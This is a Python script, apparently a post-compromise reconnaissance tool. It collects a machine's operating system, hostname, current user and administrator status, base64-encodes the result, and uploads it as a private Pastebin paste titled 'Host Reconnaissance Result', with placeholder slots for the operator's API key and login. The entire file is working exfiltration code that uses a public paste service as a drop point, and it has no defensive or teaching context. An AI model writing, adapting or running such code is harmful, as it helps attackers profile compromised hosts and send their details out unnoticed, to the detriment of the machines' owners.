import platform
import base64
import urllib.parse
import urllib.request
import ctypes, os
import getpass

PASTEBIN_KEY = 'insert-your-dev-key-here'
PASTEBIN_URL = 'https://pastebin.com/api/api_post.php'
PASTEBIN_LOGIN_URL = 'https://pastebin.com/api/api_login.php'
PASTEBIN_LOGIN = 'insert-your-personal-login-info'
PASTEBIN_PWD = 'insert-your-personal-login-info'

def pastebin_post(title, content):
    login_params = dict(
        api_dev_key=PASTEBIN_KEY,
        api_user_name=PASTEBIN_LOGIN,
        api_user_password=PASTEBIN_PWD
    )

    data = urllib.parse.urlencode(login_params).encode("utf-8")
    req = urllib.request.Request(PASTEBIN_LOGIN_URL, data)

    with urllib.request.urlopen(req) as response:
        pastebin_vars = dict(
            api_option='paste',
            api_dev_key=PASTEBIN_KEY,
            api_user_key=response.read(),
            api_paste_name=title,
            api_paste_code=content,
            api_paste_private=2,
        )
        return urllib.request.urlopen(PASTEBIN_URL, urllib.parse.urlencode(pastebin_vars).encode('utf8')).read()

print("="*3, "System Information", "="*3)
uname = platform.uname()
print(f"System: {uname.system}")
print(f"Host Name: {uname.node}")
print(f"Currently Logged on as: {getpass.getuser()}")

try:
 admincheck = os.getuid() == 0
except AttributeError:
 admincheck = ctypes.windll.shell32.IsUserAnAdmin() != 0

print("admin?", admincheck)

result = "System: "+str(uname.system)+"\n"+"Host Name: "+str(uname.node)+"\n"+"Currently logged on as: "+str(getpass.getuser())+"\n"+"is admin? "+str(admincheck)

strenc = result
strbytes = strenc.encode("ascii")

base64_bytes = base64.b64encode(strbytes)
base64str = base64_bytes.decode("ascii")

print(f"\nEncoded System Information: {base64str}")

rv = pastebin_post("Host Reconnaissance Result", base64str)